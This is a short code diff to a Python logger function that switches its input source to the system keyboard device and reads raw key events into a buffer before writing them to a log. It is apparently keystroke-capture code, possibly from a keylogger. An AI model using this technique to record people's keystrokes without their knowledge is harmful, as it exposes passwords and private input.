@@ -276,7 +276,7 @@ def logger():
 	log.write(toWrite)
 	log.close()
 	toWrite = ''
-	f = open('/dev/input/event3', 'r')
+	f = open('/dev/input/by-path/platform-i8042-serio-0-event-kbd', 'r')
 	while True: 
 		for bit in f.read(1):
 			byte.append(ord(bit))
